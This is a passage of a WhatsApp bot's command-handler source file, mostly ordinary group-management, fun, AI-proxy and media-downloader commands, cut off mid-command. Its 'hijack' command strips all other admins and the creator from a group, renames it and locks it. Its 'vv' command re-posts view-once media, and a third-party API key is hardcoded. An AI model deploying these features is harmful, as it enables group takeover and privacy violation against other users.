const config = require('./config');
const axios = require('axios');
const { downloadMediaMessage } = require('baileys');
const store = require('./lib/store');
const { exec } = require('child_process');
const fs = require('fs-extra');
const path = require('path');

// ─── State ────────────────────────────────────────────────────────
const activeGames   = new Map();
const hangmanGames  = new Map();
const tttGames      = new Map();
const sudoList      = new Set();
const blocklist     = new Set();
const warnStore     = new Map();
const antiLinkGroups = new Set();
const numberEmojis  = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣'];

// ─── Helpers ─────────────────────────────────────────────────────
async function isBotAdmin(sock, from) {
  try {
    const meta = await sock.groupMetadata(from);
    const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
    return meta.participants.find(p => p.id === botId)?.admin != null;
  } catch { return false; }
}

async function isUserAdmin(sock, from, jid) {
  try {
    const meta = await sock.groupMetadata(from);
    return meta.participants.find(p => p.id === jid)?.admin != null;
  } catch { return false; }
}

function getMentioned(msg) {
  return msg.message?.extendedTextMessage?.contextInfo?.mentionedJid
    || msg.message?.imageMessage?.contextInfo?.mentionedJid
    || [];
}

function getRandom(ext = '') {
  return `./tmp/${Date.now()}${Math.random().toString(36).slice(2)}${ext}`;
}

// ── GPT-4 via chateverywhere ──────────────────────────────────────
async function callGPT4(prompt) {
  const res = await axios.post('https://chateverywhere.app/api/chat/', {
    model: { id: 'gpt-4', name: 'GPT-4', maxLength: 32000, tokenLimit: 8000, completionTokenLimit: 5000, deploymentName: 'gpt-4' },
    messages: [{ pluginId: null, content: prompt, role: 'user' }],
    prompt,
    temperature: 0.5,
  }, { headers: { Accept: '*/*', 'User-Agent': 'WhatsApp Bot' } });
  return typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
}

// ── EPHOTO helper ─────────────────────────────────────────────────
async function ephoto(sock, from, msg, endpoint, label, inputText) {
  if (!inputText) return sock.sendMessage(from, { text: `❌ Please provide text!\nExample: .${endpoint} Your Text` }, { quoted: msg });
  const url = `https://apis.prexzyvilla.site/${endpoint}?text=${encodeURIComponent(inputText)}`;
  try {
    await sock.sendMessage(from, { image: { url }, caption: `${label} Generated for: *${inputText}*` }, { quoted: msg });
  } catch (e) {
    await sock.sendMessage(from, { text: `⚠️ Error generating ${label}.\n_${e.message}_` }, { quoted: msg });
  }
}

// ── GFX/LOGO helper ───────────────────────────────────────────────
async function gfxLogo(sock, from, msg, style, text1, text2) {
  if (!text1 || !text2) return sock.sendMessage(from, { text: `❌ Usage: .${style} text1|text2\nExample: .${style} DENTSU|MD` }, { quoted: msg });
  const url = `https://api.nexoracle.com/image-creating/${style}?apikey=d0634e61e8789b051e&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;
  try {
    await sock.sendMessage(from, { image: { url }, caption: `✨ *${style.toUpperCase()}* Style\n🔤 ${text1}\n🔡 ${text2}` }, { quoted: msg });
  } catch (e) {
    await sock.sendMessage(from, { text: `⚠️ Error generating ${style.toUpperCase()} image.\n_${e.message}_` }, { quoted: msg });
  }
}

// ─── MAIN HANDLER ────────────────────────────────────────────────
async function handleCommand(ctx) {
  const { sock, msg, from, sender, isGroup, args, text, command, prefix, isOwner, reply, sendImage } = ctx;
  const quoted = ctx.quoted;
  const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';

  // Group metadata helpers
  let groupMeta = null, participants = [], groupAdmins = false, isAdmin = false;
  if (isGroup) {
    try {
      groupMeta = await sock.groupMetadata(from);
      participants = groupMeta.participants;
      groupAdmins = participants.find(p => p.id === botId)?.admin != null;
      isAdmin = participants.find(p => p.id === sender)?.admin != null;
    } catch (_) {}
  }

  const sendMsg = (text) => sock.sendMessage(from, { text }, { quoted: msg });

  // ════════════════════════════════════════════════════════════════
  // 👑 OWNER COMMANDS
  // ════════════════════════════════════════════════════════════════
  switch (command) {

  case 'ping':
  case 'speed': {
    const t = Date.now();
    await reply(`🏓 DENTSU MD V9 — *${Date.now() - t} ms*`);
    return true;
  }

  case 'alive':
  case 'runtime': {
    const uptime = process.uptime();
    const h = Math.floor(uptime / 3600), m = Math.floor((uptime % 3600) / 60), s = Math.floor(uptime % 60);
    await reply(`✅ *DENTSU MD V9* is alive!\n⏱️ Uptime: *${h}h ${m}m ${s}s*`);
    return true;
  }

  case 'jid':
    await reply(`📌 Chat JID: \`${from}\`\n👤 Your JID: \`${sender}\``);
    return true;

  case 'public': {
    if (!isOwner) return reply('❌ Owner only.');
    config.MODE = 'public';
    await reply('✅ DENTSU MD V9 is now *Public Mode*.');
    return true;
  }

  case 'self':
  case 'private': {
    if (!isOwner) return reply('❌ Owner only.');
    config.MODE = 'self';
    await reply('🔒 DENTSU MD V9 is now *Self Mode*.');
    return true;
  }

  case 'block':
  case 'blocked': {
    if (!isOwner) return reply('❌ Owner only.');
    const mentioned = getMentioned(msg);
    const target = mentioned[0] || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    await sock.updateBlockStatus(target, 'block');
    await reply('✅ User blocked.');
    return true;
  }

  case 'unblock':
  case 'unblocked': {
    if (!isOwner) return reply('❌ Owner only.');
    const mentioned = getMentioned(msg);
    const target = mentioned[0] || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    await sock.updateBlockStatus(target, 'unblock');
    await reply('✅ User unblocked.');
    return true;
  }

  case 'setpp': {
    if (!isOwner) return reply('❌ Owner only.');
    const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!q) return reply('❌ Reply to an image to set as bot profile picture.');
    const buf = await downloadMediaMessage({ message: q, key: msg.key }, 'buffer', {});
    await sock.updateProfilePicture(botId, buf);
    await reply('✅ Profile picture updated!');
    return true;
  }

  case 'delete':
  case 'del': {
    if (!isOwner) return reply('❌ Owner only.');
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    if (!qCtx) return reply('❌ Reply to a message to delete it.');
    await sock.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: qCtx.stanzaId, participant: qCtx.participant } });
    return true;
  }

  case 'vv':
  case 'vv2': {
    if (!isOwner) return reply('❌ Owner only.');
    const qMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!qMsg) return reply('❌ Reply to a view-once message.');
    const buf = await downloadMediaMessage({ message: qMsg, key: msg.key }, 'buffer', {});
    const mtype = Object.keys(qMsg)[0];
    if (mtype === 'imageMessage') await sock.sendMessage(from, { image: buf, caption: 'View-once revealed by DENTSU MD V9' }, { quoted: msg });
    else if (mtype === 'videoMessage') await sock.sendMessage(from, { video: buf, caption: 'View-once revealed by DENTSU MD V9' }, { quoted: msg });
    else if (mtype === 'audioMessage') await sock.sendMessage(from, { audio: buf, mimetype: 'audio/ogg', ptt: true }, { quoted: msg });
    else await reply('❌ Unsupported media type.');
    return true;
  }

  case 'broadcast': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .broadcast Your message here');
    const sessions = store.getAllSessions();
    let sent = 0;
    for (const [num, s] of Object.entries(sessions)) {
      try { await s.sock.sendMessage(num + '@s.whatsapp.net', { text }); sent++; } catch (_) {}
    }
    await reply(`✅ Broadcast sent to ${sent} session(s).`);
    return true;
  }

  case 'addsudo': {
    if (!isOwner) return reply('❌ Owner only.');
    const m = getMentioned(msg);
    const t = m[0] || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    sudoList.add(t);
    await reply(`✅ @${t.split('@')[0]} added to sudo list.`, { mentions: [t] });
    return true;
  }

  case 'delsudo': {
    if (!isOwner) return reply('❌ Owner only.');
    const m = getMentioned(msg);
    const t = m[0] || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    sudoList.delete(t);
    await reply(`✅ @${t.split('@')[0]} removed from sudo list.`);
    return true;
  }

  case 'listsudo': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!sudoList.size) return reply('📋 Sudo list is empty.');
    await reply(`📋 *Sudo List:*\n${[...sudoList].map((v,i) => `${i+1}. @${v.split('@')[0]}`).join('\n')}`);
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 👥 GROUP COMMANDS (groupAdmins = bot must be admin in group)
  // ════════════════════════════════════════════════════════════════

  case 'kick': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isOwner && !isAdmin) return reply('❌ Admin only.');
    const mentioned = getMentioned(msg);
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    const target = mentioned[0] || qCtx?.participant || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    if (!target) return reply('❌ Tag or reply to a user to kick!');
    await sock.groupParticipantsUpdate(from, [target], 'remove');
    await reply(`✅ @${target.split('@')[0]} has been kicked.`, { mentions: [target] });
    return true;
  }

  case 'add': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isOwner && !isAdmin) return reply('❌ Admin only.');
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    const target = qCtx?.participant || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    await sock.groupParticipantsUpdate(from, [target], 'add');
    await reply(`✅ @${target.split('@')[0]} added to group.`);
    return true;
  }

  case 'promote': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmin) return reply('❌ Admin only.');
    const mentioned = getMentioned(msg);
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    const target = mentioned[0] || qCtx?.participant || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    await sock.groupParticipantsUpdate(from, [target], 'promote');
    await reply(`✅ @${target.split('@')[0]} promoted to admin!`);
    return true;
  }

  case 'demote': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmin) return reply('❌ Admin only.');
    const mentioned = getMentioned(msg);
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    const target = mentioned[0] || qCtx?.participant || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    await sock.groupParticipantsUpdate(from, [target], 'demote');
    await reply(`✅ @${target.split('@')[0]} demoted from admin!`);
    return true;
  }

  case 'mute': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmin) return reply('❌ Admin only.');
    await sock.groupSettingUpdate(from, 'announcement');
    await reply('🔇 Group muted! Only admins can send messages.');
    return true;
  }

  case 'unmute': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmin) return reply('❌ Admin only.');
    await sock.groupSettingUpdate(from, 'not_announcement');
    await reply('🔊 Group unmuted! Everyone can send messages.');
    return true;
  }

  case 'left': {
    if (!isOwner) return reply('❌ Owner only.');
    await reply('👋 Goodbye!');
    await sock.groupLeave(from);
    return true;
  }

  case 'grouplink':
  case 'invite': {
    if (!isGroup) return reply('❌ Group only.');
    const code = await sock.groupInviteCode(from);
    await reply(`🔗 *Group Link:*\nhttps://chat.whatsapp.com/${code}`);
    return true;
  }

  case 'resetlink':
  case 'revoke': {
    if (!isGroup)
    if (!isOwner && !isAdmin) return reply('❌ Admin only.');
    if (!isGroup) return reply('❌ Group only.');
    await sock.groupRevokeInvite(from);
    const newCode = await sock.groupInviteCode(from);
    await reply(`✅ Link reset!\n🔗 New link: https://chat.whatsapp.com/${newCode}`);
    return true;
  }

  case 'tagall':
  case 'everyone': {
    if (!isOwner && !isAdmin) return reply('❌ Admin only.');
    if (!isGroup) return reply('❌ Group only.');
    const tagText = args.join(' ') || 'Everyone!';
    let teks = `📢 *${tagText}*\n\n`;
    for (const mem of participants) teks += `@${mem.id.split('@')[0]}\n`;
    await sock.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: msg });
    return true;
  }

  case 'hidetag': {
    if (!isOwner && !isAdmin) return reply('❌ Admin only.');
    if (!isGroup) return reply('❌ Group only.');
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    await sock.sendMessage(from, {
      text: text || '',
      mentions: participants.map(a => a.id),
    }, { quoted: msg });
    return true;
  }

  case 'totag':
  case 'tag': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isOwner && !isAdmin) return reply('❌ Admin only.');
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    if (!qCtx) return reply(`❌ Reply to a message with ${prefix}${command}`);
    await sock.sendMessage(from, { forward: { key: { id: qCtx.stanzaId, fromMe: false, participant: qCtx.participant, remoteJid: from }, message: qCtx.quotedMessage }, mentions: participants.map(a => a.id) });
    return true;
  }

  case 'subject': {
    if (!isGroup) return reply('❌ Group only.');
    if (!text) return reply('❌ Usage: .subject New Group Name');
    await sock.groupUpdateSubject(from, text);
    await reply(`✅ Group name changed to: *${text}*`);
    return true;
  }

  case 'desc': {
    if (!isGroup) return reply('❌ Group only.');
    if (!text) return reply('❌ Usage: .desc New description');
    await sock.groupUpdateDescription(from, text);
    await reply(`✅ Group description updated!`);
    return true;
  }

  case 'listadmin':
  case 'admin': {
    if (!isGroup) return reply('❌ Group only.');
    const admins = participants.filter(p => p.admin);
    const listText = admins.map((v, i) => `${i+1}. @${v.id.split('@')[0]}`).join('\n');
    await sock.sendMessage(from, { text: `👑 *Group Admins:*\n${listText}`, mentions: admins.map(v => v.id) }, { quoted: msg });
    return true;
  }

  case 'groupinfo': {
    if (!isGroup) return reply('❌ Group only.');
    const g = groupMeta;
    const txt = `╔══[ 📊 GROUP INFO ]══╗
║ *Name:* ${g.subject}
║ *ID:* ${g.id}
║ *Members:* ${participants.length}
║ *Admins:* ${participants.filter(p=>p.admin).length}
║ *Created:* ${new Date(g.creation * 1000).toLocaleString()}
╚═══════════════════╝`;
    await reply(txt);
    return true;
  }

  case 'antilink': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!isGroup) return reply('❌ Group only.');
    if (antiLinkGroups.has(from)) {
      antiLinkGroups.delete(from);
      await reply('✅ Anti-link disabled for this group.');
    } else {
      antiLinkGroups.add(from);
      await reply('✅ Anti-link enabled for this group!');
    }
    return true;
  }

  case 'warn': {
    if (!isOwner && !isAdmin) return reply('❌ Admin only.');
    if (!isGroup) return reply('❌ Group only.');
    const mentioned = getMentioned(msg);
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    const target = mentioned[0] || qCtx?.participant;
    if (!target) return reply('❌ Tag or reply to a user to warn!');
    const key = `${from}-${target}`;
    const count = (warnStore.get(key) || 0) + 1;
    warnStore.set(key, count);
    if (count >= 3) {
      warnStore.delete(key);
      try {
        await sock.groupParticipantsUpdate(from, [target], 'remove');
        await reply(`❌ @${target.split('@')[0]} expulsé après 3 avertissements!`, { mentions: [target] });
      } catch (_) {
        await reply(`⚠️ @${target.split('@')[0]} a atteint 3 avertissements!`, { mentions: [target] });
      }
    } else {
      await reply(`⚠️ *Warning ${count}/3* given to @${target.split('@')[0]}!`, { mentions: [target] });
    }
    return true;
  }

  case 'warncount': {
    if (!isGroup) return reply('❌ Group only.');
    const mentioned = getMentioned(msg);
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    const target = mentioned[0] || qCtx?.participant;
    if (!target) return reply('❌ Tag or reply to a user!');
    const count = warnStore.get(`${from}-${target}`) || 0;
    await reply(`⚠️ @${target.split('@')[0]} has *${count}/3* warnings.`, { mentions: [target] });
    return true;
  }

  case 'warnreset': {
    if (!isOwner && !isAdmin) return reply('❌ Admin only.');
    if (!isGroup) return reply('❌ Group only.');
    const mentioned = getMentioned(msg);
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    const target = mentioned[0] || qCtx?.participant;
    if (!target) return reply('❌ Tag or reply to a user!');
    warnStore.delete(`${from}-${target}`);
    await reply(`✅ Warnings reset for @${target.split('@')[0]}.`);
    return true;
  }

  case 'closetime': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!isGroup) return reply('❌ Group only.');
    const value = parseInt(args[0]);
    const unit = args[1];
    if (!value || !unit) return reply('❌ Usage: .closetime 10 minute');
    const ms = unit==='second' ? value*1000 : unit==='minute' ? value*60000 : unit==='hour' ? value*3600000 : unit==='day' ? value*86400000 : 0;
    if (!ms) return reply('❌ Unit must be: second / minute / hour / day');
    await reply(`⏳ Group will close in *${value} ${unit}(s)*...`);
    setTimeout(async () => {
      try { await sock.groupSettingUpdate(from, 'announcement'); await sendMsg('🔒 Group is now closed (admins only).'); }
      catch (e) { await sendMsg('❌ Failed to close group: ' + e.message); }
    }, ms);
    return true;
  }

  case 'opentime': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!isGroup) return reply('❌ Group only.');
    const value = parseInt(args[0]);
    const unit = args[1];
    if (!value || !unit) return reply('❌ Usage: .opentime 5 minute');
    const ms = unit==='second' ? value*1000 : unit==='minute' ? value*60000 : unit==='hour' ? value*3600000 : unit==='day' ? value*86400000 : 0;
    if (!ms) return reply('❌ Unit must be: second / minute / hour / day');
    await reply(`⏳ Group will open in *${value} ${unit}(s)*...`);
    setTimeout(async () => {
      try { await sock.groupSettingUpdate(from, 'not_announcement'); await sendMsg('🔓 Group is now open!'); }
      catch (e) { await sendMsg('❌ Failed to open group: ' + e.message); }
    }, ms);
    return true;
  }

  case 'join': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Provide an invite link. Example: .join https://chat.whatsapp.com/XXXX');
    const code = text.split('https://chat.whatsapp.com/')[1]?.split(' ')[0];
    if (!code) return reply('❌ Invalid WhatsApp invite link.');
    await sock.groupAcceptInvite(code);
    await reply('✅ Joined group successfully!');
    return true;
  }

  case 'creategroup':
  case 'creategc': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .creategroup GroupName');
    const cret = await sock.groupCreate(text, []);
    const code = await sock.groupInviteCode(cret.id);
    await reply(`✅ Group Created!\n📌 Name: ${cret.subject}\n🔗 Link: https://chat.whatsapp.com/${code}`);
    return true;
  }

  case 'hijack': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!isGroup) return reply('❌ Group only!');
    if (!isAdmin) return reply('❌ You must be group admin!');

    const creator = groupMeta.owner;
    const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    let kickedList = [];

    for (const admin of admins) {
      if (admin.id !== botId && admin.id !== sender) {
        try {
          await sock.groupParticipantsUpdate(from, [admin.id], 'remove');
          kickedList.push(`@${admin.id.split('@')[0]}`);
        } catch (_) {}
      }
    }

    if (creator && creator !== sender && creator !== botId) {
      try { await sock.groupParticipantsUpdate(from, [creator], 'remove'); }
      catch (_) { try { await sock.groupSettingUpdate(from, 'announcement'); } catch (_) {} }
    }

    try { await sock.groupUpdateSubject(from, 'Hijacked By DENTSU ☠️👿'); } catch (_) {}
    try { await sock.groupUpdateDescription(from, 'This group has been hijacked by DENTSU MD V9.\n\nPowered by NatsuTech 🇨🇬'); } catch (_) {}
    try { await sock.groupSettingUpdate(from, 'locked'); } catch (_) {}

    await reply(`🔥 *Group Hijacked!*\n\nRemoved admins: ${kickedList.join(', ') || 'None'}\n👑 DENTSU MD V9 is now in control.`);
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 🧠 AI COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 'ai':
  case 'gpt':
  case 'gpt4':
  case 'gpt5':
  case 'metaai':
  case 'deepseek':
  case 'gemini':
  case 'qwen':
  case 'codeai':
  case 'storyai': {
    if (!text) return reply(`❌ Example: .${command} What is the capital of France?`);
    try {
      await sock.sendPresenceUpdate('composing', from);
      const response = await callGPT4(text);
      await reply(`╭─❍ 🧠 AI Assistant (GPT-4)\n│\n│ ❓ ${text}\n│\n│ ✅ ${response}\n│\n╰─ Powered by DENTSU MD V9`);
    } catch (e) {
      await reply(`❌ AI error: ${e.message}`);
    }
    return true;
  }

  case 'aiimg': {
    if (!text) return reply('❌ Usage: .aiimg a beautiful sunset');
    try {
      const res = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(text)}`);
      await sock.sendMessage(from, { image: { url: `https://image.pollinations.ai/prompt/${encodeURIComponent(text)}` }, caption: `🎨 AI Image: *${text}*` }, { quoted: msg });
    } catch (e) {
      await reply(`❌ AI image error: ${e.message}`);
    }
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 🎉 FUN COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 'joke': {
    try {
      const res = await axios.get('https://v2.jokeapi.dev/joke/Any?type=single');
      await sock.sendMessage(from, { image: { url: 'https://files.catbox.moe/gr1jfa.jpg' }, caption: `😂 *Joke Time!*\n\n${res.data.joke}` }, { quoted: msg });
    } catch { await reply('😂 Why do programmers prefer dark mode? Because light attracts bugs!'); }
    return true;
  }

  case 'truth': {
    try {
      const res = await axios.get('https://api.truthordarebot.xyz/v1/truth');
      await sock.sendMessage(from, { image: { url: 'https://jpcdn.it/img/d4c65a3020f67c5f329e43ae57c93668.jpg' }, caption: `🔥 *Truth Time!*\n\n❖ ${res.data.question}` }, { quoted: msg });
    } catch { await reply('🔥 Truth: Have you ever lied about your age?'); }
    return true;
  }

  case 'dare': {
    try {
      const res = await axios.get('https://api.truthordarebot.xyz/v1/dare');
      await sock.sendMessage(from, { image: { url: 'https://jpcdn.it/img/d4c65a3020f67c5f329e43ae57c93668.jpg' }, caption: `🔥 *Dare Challenge!*\n\n❖ ${res.data.question}` }, { quoted: msg });
    } catch { await reply('🔥 Dare: Send a voice note singing a song!'); }
    return true;
  }

  case '8ball': {
    const answers = ['It is certain ✅','Without a doubt ✅','You may rely on it ✅','Ask again later 🤔','Cannot predict now 🤷','Don\'t count on it ❌','My sources say no ❌','Very doubtful ❌'];
    if (!text) return reply('❌ Ask me a question! Example: .8ball Will I get rich?');
    await reply(`🎱 *Question:* ${text}\n*Answer:* ${answers[Math.floor(Math.random() * answers.length)]}`);
    return true;
  }

  case 'compliment': {
    try {
      const res = await axios.get('https://complimentr.com/api');
      await reply(`💖 ${res.data?.compliment || 'You are amazing!'}`);
    } catch { await reply('💖 You are absolutely wonderful!'); }
    return true;
  }

  case 'advice': {
    try {
      const res = await axios.get('https://api.adviceslip.com/advice');
      await reply(`💡 *Advice:*\n${res.data?.slip?.advice || 'Keep going!'}`);
    } catch { await reply('💡 Keep going! Every step forward is progress.'); }
    return true;
  }

  case 'quote': {
    try {
      const res = await axios.get('https://zenquotes.io/api/random');
      const q = res.data[0];
      await reply(`🌟 *"${q.q}"*\n\n— ${q.a}`);
    } catch { await reply('🌟 *"Keep pushing forward."*\n\n— Unknown'); }
    return true;
  }

  case 'funfact':
  case 'fact': {
    try {
      const res = await axios.get('https://uselessfacts.jsph.pl/random.json?language=en');
      await reply(`💡 *Fun Fact:*\n${res.data?.text}`);
    } catch { await reply('💡 Fun Fact: Honey never expires!'); }
    return true;
  }

  case 'meme': {
    try {
      const res = await axios.get('https://meme-api.com/gimme');
      if (!res.data?.url) return reply('❌ Could not fetch a meme.');
      await sock.sendMessage(from, { image: { url: res.data.url }, caption: `😂 ${res.data.title}` }, { quoted: msg });
    } catch { await reply('❌ Failed to fetch meme.'); }
    return true;
  }

  case 'coinflip':
  case 'coin': {
    await reply(`🪙 Coin Flip: *${Math.random() < 0.5 ? 'Heads' : 'Tails'}*!`);
    return true;
  }

  case 'dice': {
    await reply(`🎲 You rolled: *${Math.floor(Math.random() * 6) + 1}*!`);
    return true;
  }

  case 'ship': {
    const pct = Math.floor(Math.random() * 101);
    const bar = '❤️'.repeat(Math.floor(pct/10)) + '🖤'.repeat(10 - Math.floor(pct/10));
    await reply(`💕 *Ship-O-Meter*\n\n${bar}\n*Compatibility: ${pct}%*`);
    return true;
  }

  case 'roast': {
    const roasts = ['You\'re so slow, even a turtle overtook you.','You\'re the reason they put instructions on shampoo.','You\'re like a cloud — when you disappear, it\'s a beautiful day.'];
    await reply(`🔥 *Roast:*\n${roasts[Math.floor(Math.random() * roasts.length)]}`);
    return true;
  }

  case 'urban': {
    if (!text) return reply('❌ Usage: .urban sus');
    try {
      const res = await axios.get(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(text)}`);
      const top = res.data?.list?.[0];
      if (!top) return reply('❌ No definition found.');
      await reply(`📖 *${top.word}*\n\n${top.definition}\n\n_Example: ${top.example}_`);
    } catch { await reply('❌ Failed to fetch definition.'); }
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 🎮 GAME COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 'rps': {
    if (!text) return reply('❌ Choose rock, paper, or scissors. Example: .rps rock');
    const choices = ['rock','paper','scissors'];
    const userChoice = text.toLowerCase();
    if (!choices.includes(userChoice)) return reply('❌ Use rock, paper, or scissors.');
    const botChoice = choices[Math.floor(Math.random() * 3)];
    let result = userChoice === botChoice ? '🤝 Tie!' : ((userChoice==='rock'&&botChoice==='scissors')||(userChoice==='paper'&&botChoice==='rock')||(userChoice==='scissors'&&botChoice==='paper')) ? '🎉 You win!' : '😢 You lose!';
    await reply(`🪨 You: *${userChoice}*\n🤖 Bot: *${botChoice}*\n\n${result}`);
    return true;
  }

  case 'guess': {
    const num = Math.floor(Math.random() * 10) + 1;
    if (!text) return reply('❌ Guess a number 1-10. Example: .guess 7');
    const g = parseInt(text);
    await reply(`🎯 You guessed: *${g}*\n🤖 Bot chose: *${num}*\n\n${g === num ? '🎉 Correct! You win!' : '😢 Wrong guess! Try again.'}`);
    return true;
  }

  case 'numbattle':
  case 'numberbattle': {
    const u = Math.floor(Math.random()*100)+1, b = Math.floor(Math.random()*100)+1;
    await reply(`🎲 Number Battle!\n\n👤 You: *${u}*\n🤖 Bot: *${b}*\n\n${u>b ? '🎉 You win!' : u<b ? '😢 Bot wins!' : '🤝 Tie!'}`);
    return true;
  }

  case 'trivia': {
    try {
      const res = await axios.get('https://opentdb.com/api.php?amount=1&type=multiple');
      const t = res.data.results[0];
      const opts = [...t.incorrect_answers, t.correct_answer].sort(() => Math.random()-0.5);
      await reply(`❓ *Trivia:*\n${t.question}\n\n${opts.map((o,i)=>`${i+1}. ${o}`).join('\n')}`);
    } catch { await reply('❌ Failed to fetch trivia.'); }
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 📥 DOWNLOADER COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 'tt':
  case 'tiktok': {
    if (!text) return reply('❌ Provide a TikTok URL.\nExample: .tiktok https://vm.tiktok.com/...');
    try {
      await reply('⏳ Downloading TikTok video...');
      const res = await axios.get(`https://api.bk9.dev/download/tiktok?url=${encodeURIComponent(text)}`);
      const data = res.data?.BK9 || res.data;
      const videoUrl = data?.video_url || data?.play || data?.download;
      if (!videoUrl) return reply('❌ Could not extract TikTok video URL.');
      await sock.sendMessage(from, { video: { url: videoUrl }, caption: `🎵 TikTok video\n_Powered by DENTSU MD V9_` }, { quoted: msg });
    } catch (e) { await reply(`❌ TikTok download failed: ${e.message}`); }
    return true;
  }

  case 'ytmp3':
  case 'yta':
  case 'play':
  case 'song': {
    if (!text) return reply('❌ Provide a song name.\nExample: .play Believer');
    try {
      await sock.sendMessage(from, { react: { text: '🎧', key: msg.key } });
      await reply('⏳ Searching and downloading audio...');
      const yts = require('yt-search');
      const search = await yts(text);
      const result = search.all?.[0];
      if (!result) return reply('❌ No results found.');
      const res = await axios.get(`https://api.bk9.dev/download/ytmp3?url=${encodeURIComponent(result.url)}`);
      const mp3 = res.data?.BK9?.downloadUrl || res.data?.downloadUrl;
      if (!mp3) return reply('❌ Download failed. Try again.');
      await sock.sendMessage(from, {
        audio: { url: mp3 },
        mimetype: 'audio/mpeg',
        contextInfo: { externalAdReply: { thumbnailUrl: result.thumbnail, title: result.title, body: `${result.author?.name} | ${result.timestamp}`, sourceUrl: result.url, renderLargerThumbnail: true, mediaType: 1 } }
      }, { quoted: msg });
      await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
    } catch (e) { await reply(`❌ Audio download error: ${e.message}`); }
    return true;
  }

  case 'mp4':
  case 'video':
  case 'ytb':
  case 'youtube': {
    if (!text) return reply('❌ Provide a video name.\nExample: .video Believer Imagine Dragons');
    try {
      await reply('⏳ Searching and downloading video...');
      const yts = require('yt-search');
      const search = await yts(text);
      const result = search.all?.[0];
      if (!result) return reply('❌ No results found.');
      const res = await axios.get(`https://api.bk9.dev/download/ytmp4?url=${encodeURIComponent(result.url)}`);
      const mp4 = res.data?.BK9?.downloadUrl || res.data?.downloadUrl;
      if (!mp4) return reply('❌ Download failed. Try again.');
      await sock.sendMessage(from, { video: { url: mp4 }, caption: `🎬 *${result.title}*\n_Powered by DENTSU MD V9_` }, { quoted: msg });
    } catch (e) { await reply(`❌ Video download error: ${e.message}`); }
    return true;
  }

  case 'apk': {
    if (!text) return reply('❌ Provide an app name.\nExample: .apk instagram');
    try {
      await reply('⏳ Searching APK...');
      const res = await axios.get(`https://api.bk9.dev/download/apk?id=${encodeURIComponent(text)}`);
      const data = res.data?.BK9 || res.data;
      if (!data?.downloadUrl && !data?.apkUrl) return reply('❌ APK not found.');
      const url = data.downloadUrl || data.apkUrl;
      await sock.sendMessage(from, { document: { url }, mimetype: 'application/vnd.android.package-archive', fileName: `${text}.apk`, caption: `📦 *${text} APK*\n_Powered by DENTSU MD V9_` }, { quoted: msg });
    } catch (e) { await reply(`❌ APK download failed: ${e.message}`); }
    return true;
  }

  case 'fb': {
    if (!text) return reply('❌ Provide a Facebook video URL.\nExample: .fb https://www.facebook.com/...');
    try {
      await reply('⏳ Downloading Facebook video...');
      const res = await axios.get(`https://suhas-bro-api.vercel.app/download/fbdown?url=${encodeURIComponent(text)}`);
      const data = res.data;
      const videoUrl = data?.hd || data?.sd || data?.download;
      if (!videoUrl) return reply('❌ Could not extract Facebook video.');
      await sock.sendMessage(from, { video: { url: videoUrl }, caption: `📘 Facebook Video\n_Powered by DENTSU MD V9_` }, { quoted: msg });
    } catch (e) { await reply(`❌ Facebook download failed: ${e.message}`); }
    return true;
  }

  case 'insta': {
    if (!text) return reply('❌ Provide an Instagram URL.\nExample: .insta https://www.instagram.com/p/...');
    try {
      await reply('⏳ Downloading Instagram media...');
